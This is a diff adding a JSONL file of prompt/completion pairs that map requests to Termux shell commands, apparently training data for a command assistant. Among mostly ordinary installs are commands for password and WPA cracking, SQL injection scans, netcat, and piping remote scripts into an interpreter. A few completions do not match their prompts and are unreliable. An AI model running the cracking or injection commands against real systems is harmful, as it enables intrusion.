@@ -1,0 +1,1208 @@
+{"prompt": "go to downloads folder", "completion": "cd ~/storage/downloads"}
+{"prompt": "i want to use fish in termux", "completion": "pkg install fish -y"}
+{"prompt": "install fish in termux", "completion": "pkg install fish -y"}
+{"prompt": "search case insensitive", "completion": "grep -i 'error' file.txt"}
+{"prompt": "install deno package termux", "completion": "pkg install deno -y"}
+{"prompt": "get nmap on termux", "completion": "pkg install nmap -y"}
+{"prompt": "awk sum column", "completion": "awk '{sum+=$1} END {print sum}' file.txt"}
+{"prompt": "unset variable", "completion": "unset MY_VAR"}
+{"prompt": "turn on flashlight", "completion": "termux-torch on"}
+{"prompt": "tshark command not found termux", "completion": "pkg install tshark -y"}
+{"prompt": "compare two files", "completion": "diff file1.txt file2.txt"}
+{"prompt": "show termux version", "completion": "pkg show termux-tools"}
+{"prompt": "install tshark package termux", "completion": "pkg install tshark -y"}
+{"prompt": "show installed packages", "completion": "pkg list-installed"}
+{"prompt": "setup zsh termux", "completion": "pkg install zsh -y"}
+{"prompt": "termux how to get nikto", "completion": "pkg install nikto -y"}
+{"prompt": "how do i install jq on termux", "completion": "pkg install jq -y"}
+{"prompt": "setup fish termux", "completion": "pkg install fish -y"}
+{"prompt": "get mariadb on termux", "completion": "pkg install mariadb -y"}
+{"prompt": "setup nodejs termux", "completion": "pkg install nodejs -y"}
+{"prompt": "install nodejs package termux", "completion": "pkg install nodejs -y"}
+{"prompt": "delete python package", "completion": "pkg uninstall python -y"}
+{"prompt": "how to install lua", "completion": "pkg install lua -y"}
+{"prompt": "how do i install golang on termux", "completion": "pkg install golang -y"}
+{"prompt": "install python", "completion": "pkg install python -y"}
+{"prompt": "install vim package termux", "completion": "pkg install vim -y"}
+{"prompt": "i want to use make in termux", "completion": "pkg install make -y"}
+{"prompt": "shallow clone", "completion": "git clone --depth 1 https://github.com/user/repo.git"}
+{"prompt": "install pytest", "completion": "pip install pytest"}
+{"prompt": "install sqlmap", "completion": "pkg install sqlmap -y"}
+{"prompt": "get call log", "completion": "termux-call-log"}
+{"prompt": "scan network", "completion": "nmap 192.168.1.0/24"}
+{"prompt": "get location", "completion": "termux-location"}
+{"prompt": "get python on termux", "completion": "pkg install python -y"}
+{"prompt": "termux how to get make", "completion": "pkg install make -y"}
+{"prompt": "create and activate venv in one command", "completion": "python -m venv env && source env/bin/activate"}
+{"prompt": "monitor system resources", "completion": "htop"}
+{"prompt": "termux install nano", "completion": "pkg install nano -y"}
+{"prompt": "show all packages", "completion": "pkg list-all"}
+{"prompt": "update upgrade and install git", "completion": "pkg update -y && pkg upgrade -y && pkg install git -y"}
+{"prompt": "john command not found termux", "completion": "pkg install john -y"}
+{"prompt": "can i install nano in termux", "completion": "pkg install nano -y"}
+{"prompt": "termux how to get ffmpeg", "completion": "pkg install ffmpeg -y"}
+{"prompt": "install pylint", "completion": "pip install pylint"}
+{"prompt": "install git package termux", "completion": "pkg install git -y"}
+{"prompt": "show all functions", "completion": "declare -F"}
+{"prompt": "install ripgrep package termux", "completion": "pkg install ripgrep -y"}
+{"prompt": "add nodejs package termux", "completion": "pkg install nodejs -y"}
+{"prompt": "get postgresql on termux", "completion": "pkg install postgresql -y"}
+{"prompt": "termux how to get php", "completion": "pkg install php -y"}
+{"prompt": "termux update", "completion": "pkg update -y"}
+{"prompt": "nice process priority", "completion": "nice -n 10 python script.py"}
+{"prompt": "pip not found", "completion": "pkg install python-pip -y"}
+{"prompt": "install maltego", "completion": "echo 'Maltego not available in Termux — use Kali via proot-distro'"}
+{"prompt": "go back one folder", "completion": "cd .."}
+{"prompt": "compress with bzip2", "completion": "bzip2 file.txt"}
+{"prompt": "keep process running after exit", "completion": "nohup python script.py > output.log 2>&1 &"}
+{"prompt": "screen command not found termux", "completion": "pkg install screen -y"}
+{"prompt": "netcat connect", "completion": "nc 192.168.1.1 4444"}
+{"prompt": "compile c file", "completion": "gcc main.c -o main"}
+{"prompt": "can i install neovim in termux", "completion": "pkg install neovim -y"}
+{"prompt": "while loop", "completion": "i=0; while [ $i -lt 5 ]; do echo $i; i=$((i+1)); done"}
+{"prompt": "how do i install bun on termux", "completion": "pkg install bun -y"}
+{"prompt": "i want to use rust in termux", "completion": "pkg install rust -y"}
+{"prompt": "how do i install tmux on termux", "completion": "pkg install tmux -y"}
+{"prompt": "check dns", "completion": "nslookup google.com"}
+{"prompt": "install aircrack", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "i want to use golang in termux", "completion": "pkg install golang -y"}
+{"prompt": "install php package termux", "completion": "pkg install php -y"}
+{"prompt": "get gps location", "completion": "termux-location -p gps"}
+{"prompt": "install global package", "completion": "npm install -g package-name"}
+{"prompt": "get neovim on termux", "completion": "pkg install neovim -y"}
+{"prompt": "detach screen", "completion": "screen -d"}
+{"prompt": "setup apache2 termux", "completion": "pkg install apache2 -y"}
+{"prompt": "install vim in termux", "completion": "pkg install vim -y"}
+{"prompt": "can i install cmake in termux", "completion": "pkg install cmake -y"}
+{"prompt": "show cpu architecture", "completion": "uname -m"}
+{"prompt": "install redis", "completion": "pkg install redis -y"}
+{"prompt": "sort and remove duplicates", "completion": "sort -u file.txt"}
+{"prompt": "termux how to get sqlmap", "completion": "pkg install sqlmap -y"}
+{"prompt": "add curl package termux", "completion": "pkg install curl -y"}
+{"prompt": "create react app and start", "completion": "npx create-react-app myapp && cd myapp && npm start"}
+{"prompt": "search package", "completion": "pkg search python"}
+{"prompt": "get fish on termux", "completion": "pkg install fish -y"}
+{"prompt": "install openssh package termux", "completion": "pkg install openssh -y"}
+{"prompt": "can i install netcat in termux", "completion": "pkg install netcat -y"}
+{"prompt": "how to install mariadb", "completion": "pkg install mariadb -y"}
+{"prompt": "i want to use git in termux", "completion": "pkg install git -y"}
+{"prompt": "add htop package termux", "completion": "pkg install htop -y"}
+{"prompt": "create alias", "completion": "alias ll='ls -la'"}
+{"prompt": "how do i install sqlite on termux", "completion": "pkg install sqlite -y"}
+{"prompt": "need aria2 in termux", "completion": "pkg install aria2 -y"}
+{"prompt": "substring", "completion": "echo ${mystring:0:5}"}
+{"prompt": "tree command not found termux", "completion": "pkg install tree -y"}
+{"prompt": "termux how to get deno", "completion": "pkg install deno -y"}
+{"prompt": "run python3 script", "completion": "python3 script.py"}
+{"prompt": "termux how to get nmap", "completion": "pkg install nmap -y"}
+{"prompt": "attach screen", "completion": "screen -r"}
+{"prompt": "see all termux packages", "completion": "pkg list-all"}
+{"prompt": "fix termux dns", "completion": "echo \"nameserver 8.8.8.8\" > $PREFIX/etc/resolv.conf"}
+{"prompt": "apply stash", "completion": "git stash pop"}
+{"prompt": "how to install postgresql", "completion": "pkg install postgresql -y"}
+{"prompt": "get tmux on termux", "completion": "pkg install tmux -y"}
+{"prompt": "uninstall express", "completion": "npm uninstall express"}
+{"prompt": "nano command not found termux", "completion": "pkg install nano -y"}
+{"prompt": "install tensorflow", "completion": "pip install tensorflow"}
+{"prompt": "install cmake package termux", "completion": "pkg install cmake -y"}
+{"prompt": "install speedtest", "completion": "pip install speedtest-cli"}
+{"prompt": "need figlet in termux", "completion": "pkg install figlet -y"}
+{"prompt": "speed test", "completion": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python"}
+{"prompt": "how to install nano", "completion": "pkg install nano -y"}
+{"prompt": "how do i install neovim on termux", "completion": "pkg install neovim -y"}
+{"prompt": "i want to use neovim in termux", "completion": "pkg install neovim -y"}
+{"prompt": "install openssh in termux", "completion": "pkg install openssh -y"}
+{"prompt": "terminate current process", "completion": "kill $(lsof -t -i:8080)"}
+{"prompt": "install debian", "completion": "proot-distro install debian"}
+{"prompt": "check tor status", "completion": "curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip"}
+{"prompt": "test sql injection", "completion": "sqlmap -u 'http://site.com/page?id=1' --dbs"}
+{"prompt": "how do i install proxychains on termux", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "trim video", "completion": "ffmpeg -i input.mp4 -ss 00:00:10 -t 00:00:30 output.mp4"}
+{"prompt": "get openssh on termux", "completion": "pkg install openssh -y"}
+{"prompt": "how to install sqlite", "completion": "pkg install sqlite -y"}
+{"prompt": "decompress xz", "completion": "unxz file.txt.xz"}
+{"prompt": "share file", "completion": "termux-share file.txt"}
+{"prompt": "create github repo", "completion": "gh repo create myrepo --public"}
+{"prompt": "how do i install ruby on termux", "completion": "pkg install ruby -y"}
+{"prompt": "get device info", "completion": "termux-telephony-deviceinfo"}
+{"prompt": "check open ports", "completion": "netstat -tuln"}
+{"prompt": "install gcc package termux", "completion": "pkg install gcc -y"}
+{"prompt": "setup zsh and oh-my-zsh", "completion": "pkg install zsh -y && chsh -s zsh && sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""}
+{"prompt": "current user termux", "completion": "whoami"}
+{"prompt": "run job every hour", "completion": "termux-job-scheduler --job-id 1 --script ~/myscript.sh --period-ms 3600000"}
+{"prompt": "install 7zip", "completion": "pkg install p7zip -y"}
+{"prompt": "check bandwidth", "completion": "iperf3 -c server.com"}
+{"prompt": "list sms messages", "completion": "termux-sms-list"}
+{"prompt": "install git in termux", "completion": "pkg install git -y"}
+{"prompt": "refresh package list", "completion": "pkg update -y"}
+{"prompt": "install perl in termux", "completion": "pkg install perl -y"}
+{"prompt": "aria2 command not found termux", "completion": "pkg install aria2 -y"}
+{"prompt": "count lines in file", "completion": "wc -l file.txt"}
+{"prompt": "need sqlite in termux", "completion": "pkg install sqlite -y"}
+{"prompt": "install gh cli", "completion": "pkg install gh -y"}
+{"prompt": "install golang package termux", "completion": "pkg install golang -y"}
+{"prompt": "install termux styling", "completion": "pkg install termux-styling"}
+{"prompt": "get apache2 on termux", "completion": "pkg install apache2 -y"}
+{"prompt": "need golang in termux", "completion": "pkg install golang -y"}
+{"prompt": "create python project folder and install flask", "completion": "mkdir myproject && cd myproject && python -m venv env && source env/bin/activate && pip install flask"}
+{"prompt": "count words in file", "completion": "wc -w file.txt"}
+{"prompt": "show current directory", "completion": "pwd"}
+{"prompt": "need tor in termux", "completion": "pkg install tor -y"}
+{"prompt": "install alpine", "completion": "proot-distro install alpine"}
+{"prompt": "get media file info", "completion": "mediainfo video.mp4"}
+{"prompt": "backup ubuntu", "completion": "proot-distro backup ubuntu"}
+{"prompt": "open python shell", "completion": "python"}
+{"prompt": "make script executable and run", "completion": "chmod +x script.sh && ./script.sh"}
+{"prompt": "decode base64", "completion": "base64 -d encoded.txt"}
+{"prompt": "download and rename", "completion": "curl -o myfile.zip https://example.com/file.zip"}
+{"prompt": "what is prefix termux", "completion": "echo $PREFIX"}
+{"prompt": "termux how to get ruby", "completion": "pkg install ruby -y"}
+{"prompt": "socat command not found termux", "completion": "pkg install socat -y"}
+{"prompt": "crack password hash", "completion": "john --wordlist=wordlist.txt hash.txt"}
+{"prompt": "install typescript", "completion": "npm install -g typescript"}
+{"prompt": "make command not found termux", "completion": "pkg install make -y"}
+{"prompt": "add key to agent", "completion": "ssh-add ~/.ssh/id_rsa"}
+{"prompt": "scp folder to server", "completion": "scp -r myfolder/ user@192.168.1.1:/home/user/"}
+{"prompt": "how to install apache2", "completion": "pkg install apache2 -y"}
+{"prompt": "run command every minute cron", "completion": "echo '* * * * * /path/to/script.sh' | crontab -"}
+{"prompt": "keep termux up to date", "completion": "pkg update -y && pkg upgrade -y"}
+{"prompt": "install webpack", "completion": "npm install --save-dev webpack"}
+{"prompt": "list cameras", "completion": "termux-camera-info"}
+{"prompt": "install powerline fonts", "completion": "pip install powerline-status"}
+{"prompt": "add wget package termux", "completion": "pkg install wget -y"}
+{"prompt": "ruby command not found termux", "completion": "pkg install ruby -y"}
+{"prompt": "array in bash", "completion": "arr=(a b c) && echo ${arr[0]}"}
+{"prompt": "repair termux packages", "completion": "dpkg --configure -a && apt-get install -f"}
+{"prompt": "install gcc in termux", "completion": "pkg install gcc -y"}
+{"prompt": "termux how to get vim", "completion": "pkg install vim -y"}
+{"prompt": "install nmap", "completion": "pkg install nmap -y"}
+{"prompt": "get ruby on termux", "completion": "pkg install ruby -y"}
+{"prompt": "can i install hydra in termux", "completion": "pkg install hydra -y"}
+{"prompt": "check system memory", "completion": "free -h"}
+{"prompt": "install redis package termux", "completion": "pkg install redis -y"}
+{"prompt": "run process in background", "completion": "python server.py &"}
+{"prompt": "how to install nodejs", "completion": "pkg install nodejs -y"}
+{"prompt": "i want to use lua in termux", "completion": "pkg install lua -y"}
+{"prompt": "can i install bun in termux", "completion": "pkg install bun -y"}
+{"prompt": "generate ssh key", "completion": "ssh-keygen -t rsa -b 4096"}
+{"prompt": "add fish package termux", "completion": "pkg install fish -y"}
+{"prompt": "monitor all processes", "completion": "ps -ef"}
+{"prompt": "follow redirects curl", "completion": "curl -L https://example.com"}
+{"prompt": "check memory info", "completion": "cat /proc/meminfo"}
+{"prompt": "termux install zsh", "completion": "pkg install zsh -y"}
+{"prompt": "how to exit vim", "completion": "vim -c q file.txt"}
+{"prompt": "install fastapi", "completion": "pip install fastapi"}
+{"prompt": "install curl package termux", "completion": "pkg install curl -y"}
+{"prompt": "install pillow", "completion": "pip install Pillow"}
+{"prompt": "list contents of zip", "completion": "unzip -l archive.zip"}
+{"prompt": "show storage path", "completion": "echo $HOME/storage"}
+{"prompt": "termux how to get cmake", "completion": "pkg install cmake -y"}
+{"prompt": "print unique lines", "completion": "uniq file.txt"}
+{"prompt": "proxychains command not found termux", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "create bash script", "completion": "cat > script.sh << 'EOF'\n#!/bin/bash\necho hello\nEOF"}
+{"prompt": "termux install fish", "completion": "pkg install fish -y"}
+{"prompt": "set termux ssh password", "completion": "passwd"}
+{"prompt": "add specific file", "completion": "git add file.txt"}
+{"prompt": "remove ubuntu distro", "completion": "proot-distro remove ubuntu"}
+{"prompt": "install jq package termux", "completion": "pkg install jq -y"}
+{"prompt": "how do i install gcc on termux", "completion": "pkg install gcc -y"}
+{"prompt": "install jest", "completion": "npm install --save-dev jest"}
+{"prompt": "install from requirements.txt", "completion": "pip install -r requirements.txt"}
+{"prompt": "setup neovim termux", "completion": "pkg install neovim -y"}
+{"prompt": "copy folder src to backup", "completion": "cp -r src backup"}
+{"prompt": "rebase branch", "completion": "git rebase main"}
+{"prompt": "i want to use nodejs in termux", "completion": "pkg install nodejs -y"}
+{"prompt": "download torrent", "completion": "transmission-cli file.torrent"}
+{"prompt": "install netcat package termux", "completion": "pkg install netcat -y"}
+{"prompt": "compress video", "completion": "ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4"}
+{"prompt": "open sqlite database", "completion": "sqlite3 mydb.db"}
+{"prompt": "how do i install make on termux", "completion": "pkg install make -y"}
+{"prompt": "jq command not found termux", "completion": "pkg install jq -y"}
+{"prompt": "how do i install figlet on termux", "completion": "pkg install figlet -y"}
+{"prompt": "dns lookup", "completion": "dig google.com"}
+{"prompt": "init npm project", "completion": "npm init -y"}
+{"prompt": "install nikto", "completion": "pkg install nikto -y"}
+{"prompt": "list installed packages", "completion": "pkg list-installed"}
+{"prompt": "cut first column csv", "completion": "cut -d',' -f1 file.csv"}
+{"prompt": "setup php termux", "completion": "pkg install php -y"}
+{"prompt": "add gcc package termux", "completion": "pkg install gcc -y"}
+{"prompt": "setup htop termux", "completion": "pkg install htop -y"}
+{"prompt": "test ssh connection", "completion": "ssh -T git@github.com"}
+{"prompt": "disable host key check", "completion": "ssh -o StrictHostKeyChecking=no user@host"}
+{"prompt": "history of commands", "completion": "history"}
+{"prompt": "termux install wget", "completion": "pkg install wget -y"}
+{"prompt": "full port scan", "completion": "nmap -p- 192.168.1.1"}
+{"prompt": "check if 64 bit", "completion": "uname -m | grep -q x86_64 && echo 64-bit || echo 32-bit"}
+{"prompt": "check npm version", "completion": "npm --version"}
+{"prompt": "setup gcc termux", "completion": "pkg install gcc -y"}
+{"prompt": "install tor package termux", "completion": "pkg install tor -y"}
+{"prompt": "check termux architecture", "completion": "uname -m"}
+{"prompt": "what packages are installed", "completion": "pkg list-installed"}
+{"prompt": "limit process memory", "completion": "ulimit -v 512000 && python script.py"}
+{"prompt": "install cmake in termux", "completion": "pkg install cmake -y"}
+{"prompt": "connect postgresql", "completion": "psql -U postgres"}
+{"prompt": "time a command", "completion": "time python script.py"}
+{"prompt": "install nodejs", "completion": "pkg install nodejs -y"}
+{"prompt": "get redis on termux", "completion": "pkg install redis -y"}
+{"prompt": "how do i install netcat on termux", "completion": "pkg install netcat -y"}
+{"prompt": "edit zshrc", "completion": "nano ~/.zshrc"}
+{"prompt": "decompress gzip", "completion": "gunzip file.txt.gz"}
+{"prompt": "run uvicorn server", "completion": "uvicorn main:app --reload"}
+{"prompt": "need screen in termux", "completion": "pkg install screen -y"}
+{"prompt": "need fzf in termux", "completion": "pkg install fzf -y"}
+{"prompt": "npm command not found", "completion": "pkg install nodejs -y"}
+{"prompt": "turn off flashlight", "completion": "termux-torch off"}
+{"prompt": "run npm start", "completion": "npm start"}
+{"prompt": "start php server", "completion": "php -S 0.0.0.0:8080"}
+{"prompt": "download with resume", "completion": "wget -c https://example.com/bigfile.zip"}
+{"prompt": "run npm build", "completion": "npm run build"}
+{"prompt": "how do i install ffmpeg on termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "termux install sqlite", "completion": "pkg install sqlite -y"}
+{"prompt": "show uptime", "completion": "uptime"}
+{"prompt": "if else bash", "completion": "if [ $var -eq 1 ]; then echo one; else echo other; fi"}
+{"prompt": "termux cannot resolve host", "completion": "pkg install resolv-conf -y"}
+{"prompt": "clear npm cache", "completion": "npm cache clean --force"}
+{"prompt": "get sensor data", "completion": "termux-sensor -s accelerometer"}
+{"prompt": "termux how to get clang", "completion": "pkg install clang -y"}
+{"prompt": "resize image", "completion": "convert image.jpg -resize 50% output.jpg"}
+{"prompt": "check what is using port 8080", "completion": "lsof -i :8080"}
+{"prompt": "list wifi networks", "completion": "termux-wifi-scaninfo"}
+{"prompt": "search with ripgrep", "completion": "rg 'pattern' ."}
+{"prompt": "i want to use nginx in termux", "completion": "pkg install nginx -y"}
+{"prompt": "play audio file", "completion": "termux-media-player play audio.mp3"}
+{"prompt": "add make package termux", "completion": "pkg install make -y"}
+{"prompt": "need gcc in termux", "completion": "pkg install gcc -y"}
+{"prompt": "compile python to pyc", "completion": "python -m compileall script.py"}
+{"prompt": "clear pkg cache", "completion": "pkg clean"}
+{"prompt": "pull latest changes", "completion": "git pull"}
+{"prompt": "i want to use ffmpeg in termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "get cmake on termux", "completion": "pkg install cmake -y"}
+{"prompt": "run flask app", "completion": "flask run"}
+{"prompt": "download file with wget", "completion": "wget https://example.com/file.zip"}
+{"prompt": "need cmake in termux", "completion": "pkg install cmake -y"}
+{"prompt": "generate ed25519 key", "completion": "ssh-keygen -t ed25519"}
+{"prompt": "install transmission", "completion": "pkg install transmission -y"}
+{"prompt": "add ruby package termux", "completion": "pkg install ruby -y"}
+{"prompt": "python command not found termux", "completion": "pkg install python -y"}
+{"prompt": "show file history", "completion": "git log --follow file.txt"}
+{"prompt": "can i install htop in termux", "completion": "pkg install htop -y"}
+{"prompt": "need git in termux", "completion": "pkg install git -y"}
+{"prompt": "run memory benchmark", "completion": "sysbench memory run"}
+{"prompt": "fetch from remote", "completion": "git fetch origin"}
+{"prompt": "termux install nodejs", "completion": "pkg install nodejs -y"}
+{"prompt": "install zsh package termux", "completion": "pkg install zsh -y"}
+{"prompt": "create python project folder and install flask", "completion": "mkdir myproject && cd myproject && python -m venv env && source env/bin/activate && pip install flask"}
+{"prompt": "add golang package termux", "completion": "pkg install golang -y"}
+{"prompt": "extract 7z archive", "completion": "7z x archive.7z"}
+{"prompt": "i want to use wget in termux", "completion": "pkg install wget -y"}
+{"prompt": "termux install curl", "completion": "pkg install curl -y"}
+{"prompt": "install express", "completion": "npm install express"}
+{"prompt": "read user input", "completion": "read -p 'Enter your name: ' name && echo Hello $name"}
+{"prompt": "show date and time", "completion": "date"}
+{"prompt": "i want to use mariadb in termux", "completion": "pkg install mariadb -y"}
+{"prompt": "search command history", "completion": "history | grep ssh"}
+{"prompt": "update npm packages", "completion": "npm update"}
+{"prompt": "termux how to get tshark", "completion": "pkg install tshark -y"}
+{"prompt": "add nano package termux", "completion": "pkg install nano -y"}
+{"prompt": "install php in termux", "completion": "pkg install php -y"}
+{"prompt": "attach tmux session", "completion": "tmux attach -t 0"}
+{"prompt": "termux how to get aria2", "completion": "pkg install aria2 -y"}
+{"prompt": "undo last commit discard changes", "completion": "git reset --hard HEAD~1"}
+{"prompt": "install proot distro", "completion": "pkg install proot-distro -y"}
+{"prompt": "how do i install bat on termux", "completion": "pkg install bat -y"}
+{"prompt": "need john in termux", "completion": "pkg install john -y"}
+{"prompt": "alias for ubuntu login", "completion": "alias ubuntu='proot-distro login ubuntu'"}
+{"prompt": "get public ip", "completion": "curl ifconfig.me"}
+{"prompt": "add all files", "completion": "git add ."}
+{"prompt": "how to install nginx", "completion": "pkg install nginx -y"}
+{"prompt": "connect to mariadb", "completion": "mysql -u root -p"}
+{"prompt": "i want to use gcc in termux", "completion": "pkg install gcc -y"}
+{"prompt": "text to speech", "completion": "termux-tts-speak 'Hello from Termux'"}
+{"prompt": "install nerd fonts", "completion": "pkg install fontconfig && fc-cache -fv"}
+{"prompt": "need php in termux", "completion": "pkg install php -y"}
+{"prompt": "ssh tunnel port forward", "completion": "ssh -L 8080:localhost:80 user@server.com"}
+{"prompt": "how do i install deno on termux", "completion": "pkg install deno -y"}
+{"prompt": "schedule daily job", "completion": "echo '0 8 * * * /path/to/script.sh' | crontab -"}
+{"prompt": "run nodemon", "completion": "nodemon index.js"}
+{"prompt": "termux install postgresql", "completion": "pkg install postgresql -y"}
+{"prompt": "blame file", "completion": "git blame file.txt"}
+{"prompt": "nmap command not found termux", "completion": "pkg install nmap -y"}
+{"prompt": "set termux colors", "completion": "cat > ~/.termux/colors.properties << 'EOF'\nbackground=#1e1e1e\nforeground=#d4d4d4\nEOF"}
+{"prompt": "install nano package termux", "completion": "pkg install nano -y"}
+{"prompt": "install ffmpeg", "completion": "pkg install ffmpeg -y"}
+{"prompt": "tr remove spaces", "completion": "echo 'hello world' | tr -d ' '"}
+{"prompt": "need ffmpeg in termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "download youtube video", "completion": "yt-dlp https://youtube.com/watch?v=VIDEO_ID"}
+{"prompt": "set system date", "completion": "date -s '2024-01-01 12:00:00'"}
+{"prompt": "need hydra in termux", "completion": "pkg install hydra -y"}
+{"prompt": "delete file test.txt", "completion": "rm test.txt"}
+{"prompt": "create and activate conda env", "completion": "pkg install conda -y && conda create -n myenv python=3.11 -y && conda activate myenv"}
+{"prompt": "show android properties", "completion": "getprop"}
+{"prompt": "show library dependencies", "completion": "ldd $PREFIX/bin/python"}
+{"prompt": "install curl in termux", "completion": "pkg install curl -y"}
+{"prompt": "add neovim package termux", "completion": "pkg install neovim -y"}
+{"prompt": "can i install gcc in termux", "completion": "pkg install gcc -y"}
+{"prompt": "termux how to get jq", "completion": "pkg install jq -y"}
+{"prompt": "list contacts", "completion": "termux-contact-list"}
+{"prompt": "check firewall rules", "completion": "iptables -L"}
+{"prompt": "termux how to get nano", "completion": "pkg install nano -y"}
+{"prompt": "copy text from termux to clipboard", "completion": "termux-clipboard-set \"$(cat file.txt)\""}
+{"prompt": "set gopath termux", "completion": "export GOPATH=$HOME/go && export PATH=$PATH:$GOPATH/bin"}
+{"prompt": "add perl package termux", "completion": "pkg install perl -y"}
+{"prompt": "switch branch", "completion": "git checkout main"}
+{"prompt": "encode file base64", "completion": "base64 file.txt"}
+{"prompt": "can i install jq in termux", "completion": "pkg install jq -y"}
+{"prompt": "add bin to path", "completion": "export PATH=$PATH:$HOME/bin"}
+{"prompt": "install golang in termux", "completion": "pkg install golang -y"}
+{"prompt": "change default shell to zsh", "completion": "chsh -s zsh"}
+{"prompt": "sqlmap command not found termux", "completion": "pkg install sqlmap -y"}
+{"prompt": "run script on termux start", "completion": "mkdir -p ~/.termux/boot && cp script.sh ~/.termux/boot/"}
+{"prompt": "run command over ssh", "completion": "ssh user@server.com 'ls -la'"}
+{"prompt": "flush redis", "completion": "redis-cli flushall"}
+{"prompt": "pipe output to file", "completion": "ls -la > output.txt"}
+{"prompt": "connect redis cli", "completion": "redis-cli"}
+{"prompt": "install nginx in termux", "completion": "pkg install nginx -y"}
+{"prompt": "get sqlite on termux", "completion": "pkg install sqlite -y"}
+{"prompt": "how to install neovim", "completion": "pkg install neovim -y"}
+{"prompt": "set termux font size", "completion": "cat > ~/.termux/termux.properties << 'EOF'\ndefault-working-directory=/data/data/com.termux/files/home\nEOF"}
+{"prompt": "termux how to get golang", "completion": "pkg install golang -y"}
+{"prompt": "can i install socat in termux", "completion": "pkg install socat -y"}
+{"prompt": "can i install john in termux", "completion": "pkg install john -y"}
+{"prompt": "get lua on termux", "completion": "pkg install lua -y"}
+{"prompt": "can i install golang in termux", "completion": "pkg install golang -y"}
+{"prompt": "set redis key", "completion": "redis-cli set mykey myvalue"}
+{"prompt": "generate wordlist crunch", "completion": "crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt"}
+{"prompt": "show folder size", "completion": "du -sh myfolder/"}
+{"prompt": "how to install htop", "completion": "pkg install htop -y"}
+{"prompt": "crack md5 hash", "completion": "hashcat -m 0 hash.txt wordlist.txt"}
+{"prompt": "install docker", "completion": "echo 'Docker not supported natively in Termux — use proot-distro'"}
+{"prompt": "redis command not found termux", "completion": "pkg install redis -y"}
+{"prompt": "add redis package termux", "completion": "pkg install redis -y"}
+{"prompt": "force kill process", "completion": "kill -9 1234"}
+{"prompt": "install nikto package termux", "completion": "pkg install nikto -y"}
+{"prompt": "install neovim package termux", "completion": "pkg install neovim -y"}
+{"prompt": "pull specific branch", "completion": "git pull origin develop"}
+{"prompt": "ping ip address", "completion": "ping -c 4 192.168.1.1"}
+{"prompt": "check for open relays smtp", "completion": "swaks --to test@example.com --server mail.example.com"}
+{"prompt": "fix dpkg", "completion": "dpkg --configure -a && apt-get install -f"}
+{"prompt": "termux aarch64 or arm", "completion": "uname -m"}
+{"prompt": "how to install cmake", "completion": "pkg install cmake -y"}
+{"prompt": "show all environment variables", "completion": "env"}
+{"prompt": "show running processes", "completion": "ps aux"}
+{"prompt": "find file in storage", "completion": "find ~/storage -name 'file.txt'"}
+{"prompt": "install gdb in termux", "completion": "pkg install gdb -y"}
+{"prompt": "openssh command not found termux", "completion": "pkg install openssh -y"}
+{"prompt": "show fancy text", "completion": "figlet 'TermuxGPT'"}
+{"prompt": "start ssh in termux", "completion": "sshd && echo 'SSH started on port 8022'"}
+{"prompt": "need tshark in termux", "completion": "pkg install tshark -y"}
+{"prompt": "start metasploit console", "completion": "msfconsole"}
+{"prompt": "can i install zsh in termux", "completion": "pkg install zsh -y"}
+{"prompt": "htop command not found termux", "completion": "pkg install htop -y"}
+{"prompt": "how do i install nikto on termux", "completion": "pkg install nikto -y"}
+{"prompt": "termux keyboard not showing", "completion": "echo keyboard issue not code related"}
+{"prompt": "stop recording", "completion": "termux-microphone-record -q"}
+{"prompt": "top processes by memory", "completion": "ps aux --sort=-%mem | head"}
+{"prompt": "go to home directory", "completion": "cd ~"}
+{"prompt": "send sms", "completion": "termux-sms-send -n +1234567890 'Hello'"}
+{"prompt": "add rust package termux", "completion": "pkg install rust -y"}
+{"prompt": "top processes by cpu", "completion": "ps aux --sort=-%cpu | head"}
+{"prompt": "i want to use sqlite in termux", "completion": "pkg install sqlite -y"}
+{"prompt": "can i install deno in termux", "completion": "pkg install deno -y"}
+{"prompt": "extract tar to folder", "completion": "tar -xzf archive.tar.gz -C /destination/"}
+{"prompt": "need sqlmap in termux", "completion": "pkg install sqlmap -y"}
+{"prompt": "install ffmpeg in termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "install lolcat", "completion": "pip install lolcat"}
+{"prompt": "install wget package termux", "completion": "pkg install wget -y"}
+{"prompt": "node not found termux", "completion": "pkg install nodejs -y"}
+{"prompt": "ripgrep command not found termux", "completion": "pkg install ripgrep -y"}
+{"prompt": "detach tmux session", "completion": "tmux detach"}
+{"prompt": "get perl on termux", "completion": "pkg install perl -y"}
+{"prompt": "info about curl package", "completion": "pkg show curl"}
+{"prompt": "install john package termux", "completion": "pkg install john -y"}
+{"prompt": "how to install golang", "completion": "pkg install golang -y"}
+{"prompt": "install wireshark tshark", "completion": "pkg install tshark -y"}
+{"prompt": "run http server python", "completion": "python -m http.server 8080"}
+{"prompt": "install tmux package termux", "completion": "pkg install tmux -y"}
+{"prompt": "termux how to get python", "completion": "pkg install python -y"}
+{"prompt": "setup mariadb termux", "completion": "pkg install mariadb -y"}
+{"prompt": "install bun", "completion": "pkg install bun -y"}
+{"prompt": "login with custom home", "completion": "proot-distro login ubuntu --bind /sdcard:/mnt/sdcard"}
+{"prompt": "list ssh keys", "completion": "ls ~/.ssh/"}
+{"prompt": "termux how to get tor", "completion": "pkg install tor -y"}
+{"prompt": "can i install openssh in termux", "completion": "pkg install openssh -y"}
+{"prompt": "how do i install curl on termux", "completion": "pkg install curl -y"}
+{"prompt": "how do i install redis on termux", "completion": "pkg install redis -y"}
+{"prompt": "termux how to get tree", "completion": "pkg install tree -y"}
+{"prompt": "crack wpa handshake", "completion": "aircrack-ng -w wordlist.txt -b MAC capture.cap"}
+{"prompt": "termux install gcc", "completion": "pkg install gcc -y"}
+{"prompt": "install nodemon", "completion": "npm install -g nodemon"}
+{"prompt": "php command not found termux", "completion": "pkg install php -y"}
+{"prompt": "sed delete first line", "completion": "sed '1d' file.txt"}
